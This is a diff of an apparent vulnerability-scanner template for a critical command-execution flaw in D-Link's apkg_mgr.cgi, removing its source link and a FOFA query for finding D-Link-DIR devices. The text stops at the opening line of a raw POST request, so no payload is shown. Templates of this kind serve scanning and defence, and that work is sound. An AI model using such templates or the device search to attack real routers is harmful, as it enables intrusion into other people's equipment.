@@ -3,12 +3,8 @@ info:
   name: D-Link apkg_mgr.cgi存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pz3onlt0l4co1bxe'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pz3onlt0l4co1bxe
-    fofa: '"D-Link-DIR"'
 http:
 - raw:
   - 'POST /cgi-bin/apkg_mgr.cgi HTTP/1.1
